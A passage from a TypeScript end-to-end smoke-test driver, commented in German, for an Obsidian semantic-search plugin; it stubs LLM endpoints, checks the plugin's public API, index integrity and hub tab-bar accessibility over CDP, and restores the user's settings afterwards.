  // 7d setzt den Vorlagen-Ordner ins Leere, damit der Anwenden-Knopf gesperrt ist; im finally zurueck.
  let templateDirRestore: string | null = null;
  // Das Lab-Stub haengt im Renderer und muss auch nach einem Abbruch mitten im Lauf weg —
  // sonst glaubt ein spaeter installiertes echtes Lab, es sei bereits registriert.
  let labStubbed = false;
  // Stub-Lage des vollen Laufs: der Stub und die gesicherten Fixture-Listen, im finally zurueckgeschrieben.
  let stubLage: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let stubLageSaved: { emb: unknown; chat: unknown } | null = null;


  // Alles, was dieser Lauf am Wirt verändert, räumt EIN Schritt zurück: der Normalweg im `finally` (`zustand.schliesse()`),
  // Ctrl-C/SIGTERM über das Abbruch-Modul der Brücke (Hauptzweig gesperrt, dieser Schritt darf noch senden, danach Bilanz, Exit 130).
  const zustandZurueck = async (): Promise<void> => {
    if (labStubbed) {
      await main.evaluate(`
        delete app.plugins.plugins["llm-lab"];
        delete window.__vaultRagLabSeen;
        delete window.__vaultRagLabBaseline;
      `).catch(() => { console.log("  ! llm-lab-Stub konnte nicht entfernt werden — Obsidian neu laden (Cmd+R)"); });
    }
    if (healRestore) {
      // Reihenfolge zaehlt: erst die Original-Bytes zurueck, dann die Endpunkte, dann EIN
      // Reload — sonst laeuft die Kaskade auf dem Rueckweg noch einmal an.
      await main.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (window.__vaultRagSmokeIndex) {
          await app.vault.adapter.writeBinary(${JSON.stringify("__PATH__")}, window.__vaultRagSmokeIndex);
          delete window.__vaultRagSmokeIndex;
        }
        const saved = __ENDPOINTS__;
        if (saved) { p.settings.embeddingEndpoints = saved; await p.saveSettings(); }
        await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
        await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
      `.replace("__PATH__", healRestore.indexPath).replace("__ENDPOINTS__", JSON.stringify(healRestore.savedEndpoints)))
        .catch(() => { console.log("  ! Index/Endpunkte konnten nicht zurückgeschrieben werden — Auto-Heal-Kaskade oder „Index-Backup wiederherstellen“ holt den Index zurück"); });
      console.log("\n  Index-Datei und Embedding-Endpunkte wiederhergestellt.");
    }
    if (templateDirRestore !== null) {
      await main.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.settings.templateDir = ${JSON.stringify(templateDirRestore)}; await p.saveSettings(); p.refreshSmartApplyRanking();
      `).catch(() => { console.log("  ! templateDir konnte nicht zurückgeschrieben werden"); });
    }
    if (integratorRestore) {
      await main.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        await app.vault.adapter.write("Notes/Integrator plain.md", ${JSON.stringify(integratorRestore.plain)});
        await app.vault.adapter.write("Notes/Integrator related.md", ${JSON.stringify(integratorRestore.rel)});
        p.integratorStore.remove("Notes/Integrator plain.md");
        p.integratorStore.remove("Notes/Integrator related.md");
        await p.saveIntegratorStore();
      `).catch(() => { console.log("  ! Integrator-Fixture-Notizen konnten nicht zurückgeschrieben werden — `npm run shots -- --setup` stellt sie her"); });
      console.log("\n  Integrator-Fixture-Notizen und Inbox zurückgesetzt.");
    }
    if (savedChatOrder && !keep) {
      // Reihenfolge zurückschreiben: der Smoke soll die Konfiguration des Nutzers nicht
      // verändern. Über die Plugin-API statt über die UI, damit auch ein Abbruch mitten
      // im Lauf sauber aufräumt.
      await main.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const order = ${JSON.stringify(savedChatOrder)};
        const byUrl = new Map(p.settings.chatEndpoints.map(e => [e.url, e]));
        p.settings.chatEndpoints = order.map(u => byUrl.get(u)).filter(Boolean);
        await p.saveSettings();
        await p.resolveAndReconnectChat();
      `).catch(() => { console.log("  ! Reihenfolge konnte nicht zurückgeschrieben werden"); });
      console.log("\n  Reihenfolge wiederhergestellt.");
    }
    // ZULETZT: die Blöcke davor (Heal, Reihenfolge) schreiben Listen zurück, die sie MITTEN im Lauf gesichert haben — also mit
    // den Stub-URLs. Würde dies vorher laufen, überschrieben sie die Fixture-Listen mit Stub-Adressen (gemessen im ersten Vollauf).
    if (stubLageSaved) {
      // ERST die Embedding-Pause setzen und die Queue leeren, DANN die Fixture-Listen zurückstellen: Nach der Stub-Lage zeigt
      // Zeile 1 wieder auf den echten Ollama. Ein Rest in der Pending-Queue oder ein Debounce-Timer einer Notiz-Änderung würde dort
      // das Embedding-Modell laden (gemessen 2026-10-14, 21:31: ein abgebrochener Lauf hob die Pause auf, der Drain ging nach dem
      // Zurückstellen an :11434). Die Pause bleibt im Profil der Zweitinstanz stehen; die Stub-Lage hebt sie beim nächsten Lauf auf.
      await main.evaluate(STUB_LAGE_SCHUTZ + "\nreturn true;").catch(() => { console.log("  ! Embedding-Pause konnte vor dem Zurückstellen der Endpunkt-Listen nicht gesetzt werden"); });
      await main.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const v = ${JSON.stringify(stubLageSaved)};
        for (const l of [p.settings.embeddingEndpoints, p.settings.chatEndpoints]) {
          for (const e of l) if (e && e.secretId) app.secretStorage.setSecret(e.secretId, "");
        }
        p.settings.embeddingEndpoints = v.emb; p.settings.chatEndpoints = v.chat;
        await p.saveSettings();
        return true;
      `).catch(() => { console.log("  ! Fixture-Endpunkt-Listen konnten nicht zurückgeschrieben werden — `npm run shots -- --setup` stellt sie her"); });
    }
    if (stubLage) await stubLage.stop().catch(() => undefined);
  };
  const zustand = beimAbbruch(zustandZurueck, "Wirt-Zustand zurücksetzen");

  try {
    // Chromium drosselt nicht-fokussierte Fenster — ohne bringToFront misst man Phantome.
    await main.send("Page.bringToFront");

    let active = await main.evaluate<boolean>(
      `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];`,
    );
    // Ein frischer Staging-Vault startet im Restricted Mode, ein frisches Profil fragt „Dem Ersteller vertrauen“ —
    // ein Neuladen (Cmd+R) hebt beides nicht auf. `bereiteInstanzVor` bestätigt den Dialog und lädt das Plugin,
    // aber nur im eigenen Staging-Vault (`nurVault`); in einem fremden Vault bleibt es bei der Meldung unten.
    let hinweis = "";
    if (!active) {
      const r = await bereiteInstanzVor(main, { pluginIds: [PLUGIN_ID], nurVault: STAGING_VAULT });
      hinweis = r.hinweis;
      console.log(`  Instanz vorbereitet: ${r.hinweis}`);
      active = r.plugins[PLUGIN_ID] === "geladen";
    }
    if (!active) throw new Error(`Plugin ${PLUGIN_ID} ist nicht aktiv (${hinweis || "keine Vorbereitung"}). Frischer Vault im Restricted Mode? Der Treiber schaltet nur im Staging-Vault „${STAGING_VAULT}“ frei; sonst erst \`npm run deploy\`.`);

    // Laeuft dieser Lauf ueberhaupt gegen den eigenen Stand? `manifest.version` ist dagegen
    // STRUKTURELL blind — Store- und Repo-Build tragen dieselbe Nummer.
    //
    // Der Pfad kommt aus der LAUFENDEN Instanz, nicht aus `stagingVaultDir(...)`: der Treiber
    // dockt per `--vault` an ein beliebiges Fenster an, ein Check gegen den Staging-Pfad wuerde
    // also eine Datei pruefen, die mit dem Lauf nichts zu tun hat. Geprueft wird, was gemessen
    // wird (Dach-README, korrigiert 2026-09-02).
    //
    // Fuer dieses Repo besonders wichtig: die AGENTS.md fuehrte `10_Pallas` bis 2026-09-02 als
    // "Plugin-Ordner ist ein Symlink aufs Repo, Reload reicht". Gemessen ist es ein echtes
    // Verzeichnis mit Kopien — ohne `npm run deploy` misst der Lauf den alten Build (`7adf475`).
    const vaultInfo = await main.evaluate<{ basePath: string; configDir: string }>(`
      return { basePath: app.vault.adapter.basePath, configDir: app.vault.configDir };
    `);
    requireEigenerBuild(
      join(vaultInfo.basePath, vaultInfo.configDir, "plugins", PLUGIN_ID, "main.js"),
      // Der Vergleichsstand muss frisch sein — sonst sagt der Vergleich nichts. `npm run deploy`
      // baut ihn direkt davor.
      join(cwd(), "main.js"),
      (meldung) => {
        herkunftsWarnung = meldung;
        console.warn(meldung);
      },
    );

    // Sprache der LAUFENDEN Oberfläche ermitteln und daraus die erwarteten Zustandstexte
    // ableiten. Obsidian legt die Wahl in `localStorage.language` ab; fehlt sie, gilt Englisch.
    // Der Treiber vergleicht danach gegen dasselbe Wörterbuch, aus dem die UI ihre Texte nimmt —
    // er prüft also weiterhin, dass die richtige ROLLE angezeigt wird (ein falscher Schlüssel
    // fällt weiter auf), nur nicht mehr, in welcher Sprache.
    // DIESELBE Quelle wie das Plugin: `main.ts:186` ruft `pickLang(getLanguage())`, und Obsidian
    // spiegelt `getLanguage()` in `document.documentElement.lang`. (Das Plugin selbst leitet
    // nirgends aus `localStorage` ab — gemessen 2026-09-06, `src/` kennt den Key nicht.)
    //
    // `localStorage.language` ist dagegen die **Einstellung fuer den naechsten Start**, nicht
    // die geladene Sprache. Beide Werte weichen deshalb in ZWEI Lagen ab, nicht nur in einer:
    //   · frisches Profil (Zweitinstanz) — der Key fehlt, Obsidian nimmt die Systemsprache;
    //     der Treiber erwartete „active" gegen eine Oberflaeche, die „aktiv" rendert:
    //     drei falsch-rote Punkte (2026-09-03, hier gemessen).
    //   · nach einer Sprachumstellung OHNE Neustart — der Key sagt schon „de", die laufende
    //     Oberflaeche steht noch auf Englisch (2026-08-18 in `apple-health` gemessen, zwei
    //     Wochen vor uns; deren Fassung nennt diesen allgemeineren Grund, unsere nannte nur
    //     die erste Lage).
    //
    // n=3 (apple-health 08-18, hier 09-03, local-image-generator 09-06), drei unabhaengige
    // Entdeckungen ohne REGISTRY-Eintrag — genau der Fall, gegen den der Katalog steht; der
    // Eintrag entsteht gerade. Sechs Treiber im Dach tragen die defekte Fassung noch, fuenf
    // davon `shots.ts`: dort erzeugt sie falsch beschriftete README-Bilder statt roter Punkte,
    // der Lauf ist also gruen und das Ergebnis trotzdem falsch.
    const uiLang = await main.evaluate<string>(
      `return document.documentElement.lang || (window.localStorage && localStorage.getItem("language")) || "en";`,
    );
    const W = uiLang.startsWith("de") ? DE : EN;
    // Seit Welle 16 teilen beide Listen das Rollen-Vokabular des Kits; die Embedding-Liste überschreibt
    // nur `skipped-model` (nennt den Index) und trägt sonst dieselben Texte wie die Chat-Liste.
    const KE = (uiLang.startsWith("de") ? LLM_CONNECTION_STRINGS_DE : LLM_CONNECTION_STRINGS_EN).endpointList;
    const LK = {
      active: KE.role({ kind: "active" }),
      standby: KE.role({ kind: "standby", position: 98765 }).replace("98765", "{0}"),
      unreachable: KE.role({ kind: "unreachable" }),
      skippedModel: KE.role({ kind: "skipped-model" }),
      checking: KE.probing,
    };
    const L = { ...LK, skippedModel: W["endpointRole.skippedModel"], checking: W["settings.conn.checking"] };
    const isChecking = (state: string | null): boolean => state === L.checking || state === LK.checking;
    console.log(`  (Oberflächensprache: ${uiLang} — Embedding „${L.active}" / „${L.unreachable}", Chat (Kit) „${LK.active}" / „${LK.unreachable}")\n`);

    // Stub-Lage (Welle 20, B1): Der volle Lauf schickt NIE eine Anfrage an die Fixture-Endpunkte (:1234/:11434, LM-Regel).
    // Die jeweils erste Zeile beider Listen zeigt auf den zentralen LLM-Stub, die zweite bleibt der tote Port der Fixture
    // (:11435/:1235). Dadurch sind Zeilenzustaende, Schluessel, Modell-Weg und Anfrage-Koerper messbar; was das ECHTE
    // Modell braucht (Anfrage-Vektoren des Index), bleibt "nichts gemessen" mit diesem Grund.
    if (!nur) {
      const modelle = await main.evaluate<{ emb: string; chat: string }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        return { emb: p.settings.embeddingEndpoints[0]?.model || "", chat: p.settings.chatEndpoints[0]?.model || "" };
      `);
      // Anfrage-Vektor des Stubs: der gespeicherte Vektor EINER indexierten Notiz (dieselbe Dimension, gleiche Normierung),
      // damit die Kontextsuche des Chats Treffer hat. Mit einem Phantasie-Vektor fände sie keine, und der Chat-Punkt
      // würde am Stub rot statt am Plugin. Er sagt nichts über die Semantik (siehe die beiden Punkte mit Anfrage-Vektor).
      const stubVektor = await main.evaluate<number[] | null>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const f = p.index ? app.vault.getMarkdownFiles().find((x) => p.index.vectorFor(x.path)) : null;
        return f ? Array.from(p.index.vectorFor(f.path)) : null;
      `);
      stubLage = await startLlmStub({
        models: [modelle.emb, modelle.chat].filter((m) => m !== ""),
        embeddings: { vektor: stubVektor ?? Array.from({ length: 256 }, () => 0.0625) },
        lmStudioV1: true,
      });
      stubLageSaved = await main.evaluate<{ emb: unknown; chat: unknown }>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const gesichert = { emb: JSON.parse(JSON.stringify(p.settings.embeddingEndpoints)), chat: JSON.parse(JSON.stringify(p.settings.chatEndpoints)) };
        if (p.settings.embeddingEndpoints[0]) p.settings.embeddingEndpoints[0].url = ${JSON.stringify(stubLage.url)};
        if (p.settings.chatEndpoints[0]) {
          p.settings.chatEndpoints[0].url = ${JSON.stringify(stubLage.url)};
          // Ein Schluessel an der Chat-Zeile 1: erst damit tragen die Zeilen das Schluessel-Icon (Punkt "Warn-/Schluessel-Icons").
          // Er wandert beim Aufloesen in den Schluesselbund und wird im finally dort geleert; die Fixture-Datei bekommt ihn nie zurueck.
          p.settings.chatEndpoints[0].apiKey = "stub-lage-schluessel";
        }
        await p.saveSettings();
        await p.resolveAndReconnectChat();
        await p.resolveAndReconnectEmbedder();
        // Erst NACH dem Umschalten auf den Stub fortsetzen: ein Rest-Zustand der Pause (der letzte Lauf lässt sie stehen) darf
        // nie gegen die echten Fixture-Endpunkte aufgelöst werden.
        p.setEmbeddingPaused(false);
        return gesichert;
      `);
      console.log(`  (Stub-Lage: beide Listen zeigen mit Zeile 1 auf ${stubLage.url}, Zeile 2 bleibt der tote Fixture-Port)\n`);
    }

    const MGR = "llm-endpoint-manager";
    const MGR_MODEL = "w8-manager-modell";
    const MGR_EMB_MODEL = "w8-fremdes-embedding-modell";

    // Die Sektionen 0 bis 9 laufen nur im vollen Lauf; `--only` springt zu 7e2/7e3.
    vorlauf: {
    if (nur) break vorlauf;
    // --- 0. Plugin-API für Fremdplugins ------------------------------------
    // Der Aufruf läuft über CDP im Renderer, also exakt auf dem Weg, den ein anderes
    // Obsidian-Plugin nimmt (`app.plugins.plugins[id].api`) — nicht über internen Code.
    // Genau das können Unit-Tests strukturell nicht: dass der Vertrag am echten
    // Plugin-Objekt hängt und über die Renderer-Grenze JSON-tauglich ankommt.
    const probe = await main.evaluate<ApiProbe>(`
      const api = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].api;
      if (!api) return { present: false };
      const status = api.status();
      // Voraussetzung selbst herstellen statt sie zu hoffen (REGISTRY-Falle 11): eine
      // Notiz suchen, die WIRKLICH im Index steht. Irgendeine zu raten macht den
      // Prüfpunkt falsch-rot, sobald die erste Datei eine leere Ordner-Notiz ist.
      let related = null, relatedPath = null;
      for (const f of app.vault.getMarkdownFiles().slice(0, 200)) {
        const r = await api.related(f.path);
        if (r.ok || r.reason !== "not-indexed") { related = r; relatedPath = f.path; break; }
      }
      const search = await api.search("Notiz");
      // Werkzeug-Anbieter (Branch feat/tool-provider): dieselbe Renderer-Grenze wie oben.
      const tools = typeof api.tools === "function" ? api.tools() : null;
      const toolExec = typeof api.executeTool === "function" && relatedPath
        ? await api.executeTool("related_notes", { path: relatedPath }) : null;
      const toolBad = typeof api.executeTool === "function" ? await api.executeTool("nope", {}) : null;
      return {
        tools, toolExec, toolBad,
        present: true,
        apiVersion: api.apiVersion,
        providerVersion: api.version,
        keys: Object.keys(api).sort(),
        status,
        statusIsSync: !(status && typeof status.then === "function"),
        related, relatedPath, search,
        serialisable: JSON.stringify({ status, related, search }).length > 0,
      };
    `);

    record("Plugin-API hängt am Plugin-Objekt und nennt ihre Version",
      probe.present && probe.apiVersion === 1, `apiVersion ${String(probe.apiVersion)}`);
    // Regressionsschutz gegen ein spaeteres `this.api = this.facade`: der externe Vertrag
    // darf NICHT readNote/embedQuery/searchVector tragen (Dateizugriff und Vektor-Interna).
    // Seit 0.32.0 kommen `proposeLinks`/`applyLink` dazu (Integrator, Spec 2026-09-07 §8) —
    // additiv, apiVersion bleibt 1. Die Liste bleibt vollstaendig aufgezaehlt, damit eine
    // versehentliche Ausweitung (etwa `this.api = this.facade`) weiter auffaellt.
    // Auf dem Branch feat/tool-provider: NICHT mehr „exakt diese Schluessel" (das ist auf `main`
    // der API-Schutz), sondern „mindestens diese, dazu tools/executeTool, und nie die Interna".
    const apiKeys = probe.keys ?? [];
    const apiPflicht = ["apiVersion", "applyLink", "executeTool", "proposeLinks", "related", "search", "status", "tools", "version"];
    const apiVerboten = ["readNote", "embedQuery", "searchVector"];
    record("Fläche trägt mindestens status/search/related/proposeLinks/applyLink und tools/executeTool, keine Interna",
      apiPflicht.every(k => apiKeys.includes(k)) && !apiVerboten.some(k => apiKeys.includes(k)),
      apiKeys.join(", "));
    const toolNames = (probe.tools ?? []).map(d => d.name);
    record("tools() liefert search und related als Definitionen, executeTool() antwortet als Wert",
      JSON.stringify(toolNames) === JSON.stringify(["semantic_search", "related_notes"])
        && (probe.tools ?? []).every(d => d.writes === false && d.parameters?.type === "object")
        && probe.toolExec?.ok === true && (probe.toolBad as { reason?: string } | null)?.reason === "unknown-tool",
      `tools ${toolNames.join(", ")} · related_notes ok=${String(probe.toolExec?.ok)} · unbekannt → ${String((probe.toolBad as { reason?: string } | null)?.reason)}`);
    record("Der Anbieter besteht den Wirts-Guard des Kits (version, tools, executeTool)",
      probe.providerVersion === 1 && apiKeys.includes("tools") && apiKeys.includes("executeTool")
        && (probe.tools ?? []).every(d => typeof d.name === "string" && typeof d.description === "string" && typeof d.writes === "boolean"),
      `version ${String(probe.providerVersion)} · ${(probe.tools ?? []).length} Definitionen mit name/description/writes`);
    record("status() ist synchron und meldet einen Index",
      probe.statusIsSync === true && probe.status?.indexed === true && (probe.status?.noteCount ?? 0) > 0,
      `indexed=${String(probe.status?.indexed)} · ${probe.status?.noteCount ?? 0} Notizen`);
    // Regressionsschutz für den Abnahme-Befund vom 2026-09-07: der Kit-Merge kopiert unbekannte
    // Schlüssel aus data.json, die Migration lief deshalb bei jedem Start erneut und füllte ein
    // bewusst geleertes Zeilen-Modell wieder auf. Die pure Hälfte (`stripLegacyGlobalModels`)
    // ist unit-getestet; dass sie in `onload` an der richtigen Stelle läuft, sieht nur dieser Punkt.
    const legacyKeys = await main.evaluate<string[]>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      // Seit Welle 14 zaehlen die vier Sampling-Regler dazu (chatTemperature, suppressThinking,
      // smartApplyTemperature, smartApplySuppressThinking): sie gehen in den Block request auf.
      return ["embeddingModel","chatModel","chatTemperature","suppressThinking","smartApplyTemperature","smartApplySuppressThinking"].filter(k => k in p.settings);
    `);
    record("Keine Alt-Schlüssel des globalen Modells und der Sampling-Regler in den Einstellungen",
      legacyKeys.length === 0,
      legacyKeys.length === 0 ? "Alt-Schlüssel: keine" : `Alt-Schlüssel: ${legacyKeys.join(", ")}`);
    record("related() liefert Treffer für eine indexierte Notiz",
      probe.related?.ok === true && (probe.related.hits?.length ?? 0) > 0,
      `${probe.relatedPath ?? "(keine Notiz geprüft)"} → ${probe.related?.ok ? `${probe.related.hits?.length ?? 0} Treffer` : `reason=${String(probe.related?.reason)}`}`);
    record("Rückgaben überstehen die Renderer-Grenze (JSON-tauglich)",
      probe.serialisable === true, "kein TypedArray, keine Klasseninstanz");
    // Falle 16 der REGISTRY: ein Prüfpunkt, der nur den Fehlerfall anfasst, beweist nichts.
    // search() braucht den Embedding-Endpunkt — ist er tot, ist "offline" die RICHTIGE
    // Antwort und kein Befund. Dann übersprungen statt falsch-grün oder falsch-rot.
    if (stubLage) {
      unmeasured("search() liefert semantische Treffer", "Stub-Lage: der Anfrage-Vektor kommt vom Stub, nicht vom Embedding-Modell (LM-Regel) — Treffer sagen nichts über die Semantik");
    } else if (probe.search?.ok) {
      record("search() liefert semantische Treffer", (probe.search.hits?.length ?? 0) > 0,
        `${probe.search.hits?.length ?? 0} Treffer`);
    } else if (probe.search?.reason === "offline") {
      unmeasured("search() liefert semantische Treffer", "Embedding-Endpunkt nicht erreichbar (korrekte Antwort, aber der Erfolgsfall bleibt ungeprüft)");
    } else {
      record("search() liefert semantische Treffer", false, `reason=${String(probe.search?.reason)}`);
    }

    // --- 0a. Selbstfindungs-Probe (Index-Zuordnung) -------------------------
    // WARUM DIESER PRUEFPUNKT EXISTIERT: am 2026-08-30 trug der Arbeits-Vault einen Index,
    // dessen Vektormatrix zu einer aelteren, kuerzeren Pfadliste gehoerte — jede Zeile war um
    // 4 bis 29 Positionen verschoben, ~79 % der Notizen lieferten damit die Aehnlichkeit einer
    // FREMDEN Notiz. Kein bestehender Waechter konnte das sehen: CRC32 gruen, count plausibel,
    // Byte-Guard zufrieden, `status()` meldete `indexed: true`, und die Scores sahen mit
    // 0.85–0.92 vertrauenswuerdiger aus als ein gesunder Index. Der Schaden war nur daran zu
    // erkennen, dass eine Notiz sich ueber ihren EIGENEN Wortlaut nicht mehr fand.
    //
    // Die Probe ist bewusst auf kurze Notizen beschraenkt: unter der Chunk-Grenze (800 Zeichen)
    // ist die Notiz genau EIN Chunk, ihr Index-Vektor also das Embedding genau dieses Textes.
    // Damit ist Rang 0 die einzig richtige Antwort und der Prueflings-Erwartungswert steht
    // VORHER fest (LESSON local-image-generator 2026-08-23) — bei langen Notizen mischt die
    // mean-Aggregation mehrere Chunks und ein Rang > 0 waere legitim.
    // Mutation und Wartephase TRENNEN (Dach-AGENTS.md, Umbau-Muster `paperless-storage:201`):
    // die Probe macht bis zu sechs `search()`-Aufrufe, jeder embeddet seine Query ueber den
    // Endpunkt. Unter Last dauert einer 5–8 s (gemessen 2026-09-03: neun fremde Verbindungen an
    // Ollama), sechs davon in EINEM `evaluate` sprengen die 30-s-Grenze von `Cdp.send` — der
    // Lauf brach mit „Zeitueberschreitung: Runtime.evaluate" ab, ohne dass am Prueffling etwas
    // fehlte. Deshalb: im Renderer STARTEN und das Ergebnis ablegen, auf der Node-Seite pollen.
    await main.evaluate(`
      window.__vaultRagSelfFind = null;
      (async () => {
      const api = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].api;
      if (!api) { window.__vaultRagSelfFind = { present: false, tried: [], offline: false }; return; }
      const strip = (t) => t.replace(/^---\\s*\\n[\\s\\S]*?\\n---\\s*\\n/, "").trim();
      // Voraussetzung selbst herstellen (REGISTRY-Falle 11): nur Notizen nehmen, die WIRKLICH
      // im Index stehen. related() ist dafuer der billige Test — es rechnet offline auf dem
      // Index und braucht keinen Embedding-Endpunkt.
      const cands = [];
      for (const f of app.vault.getMarkdownFiles()) {
        if (cands.length >= 6) break;
        let body;
        try { body = strip(await app.vault.cachedRead(f)); } catch (e) { continue; }
        if (body.length <= 200 || body.length > 800) continue;
        const r = await api.related(f.path);
        if (!r.ok && r.reason === "not-indexed") continue;
        cands.push({ path: f.path, query: body.slice(0, 300) });
      }
      const tried = [];
      let offline = false;
      for (const c of cands) {
        const res = await api.search(c.query);
        if (!res.ok) { if (res.reason === "offline") offline = true; continue; }
        const hits = res.hits ?? [];
        const rank = hits.findIndex(h => h.path === c.path);
        tried.push({ path: c.path, rank, top: hits[0] ? hits[0].path : null });
      }
      window.__vaultRagSelfFind = { present: true, tried, offline };
      })().catch(e => { window.__vaultRagSelfFind = { present: true, tried: [], offline: false, error: String(e) }; });
      return true;
    `);
    const selfFind = await pollUntil<SelfFindProbe & { error?: string }>(main,
      `return window.__vaultRagSelfFind;`, 240_000, 2_000)
      ?? { present: true, tried: [], offline: false, error: "Probe nach 240 s ohne Ergebnis — Embedding-Endpunkt unter Last?" };

    if (stubLage) {
      unmeasured("Notizen finden sich ueber ihren eigenen Wortlaut", "Stub-Lage: der Anfrage-Vektor kommt vom Stub, nicht vom Embedding-Modell (LM-Regel) — Rang 0 ist nur mit dem echten Modell zu belegen");
    } else if (selfFind.error) {
      record("Notizen finden sich ueber ihren eigenen Wortlaut", false, selfFind.error);
    } else if (!selfFind.present) {
      record("Notizen finden sich ueber ihren eigenen Wortlaut", false, "Plugin-API nicht erreichbar");
    } else if (selfFind.offline || selfFind.tried.length === 0) {
      // Falle 16 der REGISTRY: ohne Embedding-Endpunkt ist "keine Antwort" die RICHTIGE
      // Antwort und kein Befund — dann uebersprungen statt falsch-gruen oder falsch-rot.
      unmeasured("Notizen finden sich ueber ihren eigenen Wortlaut", "kein Embedding-Endpunkt oder keine kurze indexierte Notiz gefunden");
    } else {
      const hit = selfFind.tried.filter(t => t.rank === 0);
      // Schwelle statt Perfektion: zwei Notizen mit (fast) gleichem Wortlaut duerfen sich
      // gegenseitig verdraengen. Ein VERSCHOBENER Index faellt damit trotzdem sicher auf —
      // dort lag die Trefferquote bei 20 %, nicht bei 80 %.
      const ok = hit.length >= Math.max(1, selfFind.tried.length - 1);
      const misses = selfFind.tried.filter(t => t.rank !== 0)
        .map(t => `${t.path.split("/").pop()}: Rang ${t.rank} (statt ihrer steht ${t.top ? t.top.split("/").pop() : "nichts"} vorn)`);
      record("Notizen finden sich ueber ihren eigenen Wortlaut",
        ok, `${hit.length}/${selfFind.tried.length} auf Rang 0${misses.length ? " · " + misses.join(" · ") : ""}`);
    }

    // --- 0b. Hub-Tab-Leiste (obsidian-kit buildHubInto) ---------------------
    // Was hier gemessen wird, kann vitest strukturell nicht: das node-Env hat kein Layout,
    // also auch keinen Zeilenumbruch. Genau dafuer existiert dieser Treiber. Die ARIA-Rollen
    // sind mit Kit 0.27.0 neu — die lokale Fassung setzte keinerlei Attribute.
    const hub = await main.evaluate<HubProbe>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      await p.openHub("related");
      // Warten statt Sofortabfrage: die View baut ihren Inhalt in onOpen, das nach dem Reveal
      // noch ausstehen kann.
      for (let i = 0; i < 40 && !document.querySelector(".okit-hub-root"); i++) {
        await new Promise(r => setTimeout(r, 250));
      }
      const root = document.querySelector(".okit-hub-root");
      if (!root) return { present: false };
      const tabs = [...root.querySelectorAll(".okit-hub-tab")];
      return {
        present: true,
        tablist: root.querySelector(".okit-hub-tabs")?.getAttribute("role") ?? null,
        count: tabs.length,
        selected: tabs.filter(t => t.getAttribute("aria-selected") === "true").length,
        // Roving tabindex: genau der aktive Tab ist per Tab-Taste erreichbar, der Rest per Pfeil.
        focusable: tabs.filter(t => t.getAttribute("tabindex") !== "-1").length,
        controls: tabs.every(t => {
          const id = t.getAttribute("aria-controls");
          return !!id && !!document.getElementById(id);
        }),
      };
    `);
    record("Hub rendert die Kit-Grammatik", hub.present, hub.present ? ".okit-hub-root vorhanden" : "kein .okit-hub-root im angehängten Fenster nach 10 s — hängt der Treiber an einem Pop-out (workspace.json → floating) oder ist das Plugin nicht aktiv?");
    record("Tab-Leiste ist eine ARIA-Tabliste", hub.tablist === "tablist", `role="${hub.tablist ?? "(fehlt)"}" · ${hub.count} Tabs`);
    record("Genau ein Tab ist als ausgewaehlt gemeldet", hub.selected === 1, `${hub.selected} von ${hub.count} mit aria-selected=true`);
    record("Roving tabindex: nur der aktive Tab ist tabbar", hub.focusable === 1, `${hub.focusable} von ${hub.count} tabbar`);
    record("Jeder Tab zeigt auf ein existierendes Panel", hub.controls === true, "aria-controls aufloesbar");

    // Der eigentliche Layout-Beleg: bricht die Leiste bei schmaler Sidebar um, statt die Tabs
    // unlesbar zu stauchen? Das kann vitest nicht — node hat kein Layout.
    //
    // Die Breite wird ueber `rightSplit.setSize()` gesetzt, NICHT ueber `style.width` am
    // `.workspace-leaf`: gemessen 2026-08-27 ist das Leaf nicht breitenbestimmend, die Zahlen
    // blieben von 1000px bis 140px unveraendert. Ein Pruefpunkt, dessen Mutation nicht wirkt,
    // ist gruen oder rot ohne etwas zu belegen — die teurere Variante ist hier die einzige.
    //
    // Mutation und Wartephase getrennt (Muster: paperless-storage/scripts/gui-smoke.ts:201):
    // ein `waitFor` IM Renderer liefe gegen den 30-s-Abbruch von `Cdp.send`.
    const WIDE = 560, NARROW = 240;
    // ⚠️ Der Guard `Math.abs(breite - soll) > 8 -> null` ist load-bearing, nicht defensiv:
    // `pollUntil` kehrt beim ersten TRUTHY Wert zurueck, und ein Objektliteral ist immer truthy.
    // Ohne ihn misst der Poll den Zustand VOR `setSize` und kehrt sofort damit zurueck — der
    // Punkt war am 2026-09-04 deshalb rot, mit „560px (ist 300px) / 240px (ist 300px)": zweimal
    // dieselbe Breite, also eine Mutation, die nie ankam. Isoliert nachgemessen liefert dasselbe
    // Plugin 560px -> 1 Zeile und 240px -> 2 Zeilen, der Punkt ist also inhaltlich gruen.
    // (Verwandt und schon bekannt: eine EINGEKLAPPTE Sidebar ignoriert `setSize` ganz — der
    // Guard faengt jetzt beide Faelle, statt nur den einen zu kommentieren.)
    const TAB_ROWS = (soll: number): string => `
      const root = document.querySelector(".okit-hub-root");
      if (!root) return null;
      const breite = Math.round(root.getBoundingClientRect().width);
      if (Math.abs(breite - ${soll}) > 8) return null;   // Mutation noch nicht angekommen
      const tabs = [...document.querySelectorAll(".okit-hub-tab")];
      const boxen = tabs.map(t => t.getBoundingClientRect());
      return { zeilen: new Set(boxen.map(b => Math.round(b.top))).size,
               ueberlauf: boxen.some(b => b.right > document.querySelector(".okit-hub-tabs").getBoundingClientRect().right + 1),
               breite };
    `;
    const rowsAfter = async (px: number): Promise<{ zeilen: number; ueberlauf: boolean; breite: number }> => {
      await main.evaluate(`app.workspace.rightSplit.setSize(${px}); return true;`);
      const r = await pollUntil<{ zeilen: number; ueberlauf: boolean; breite: number }>(main, TAB_ROWS(px), 5000, 200);
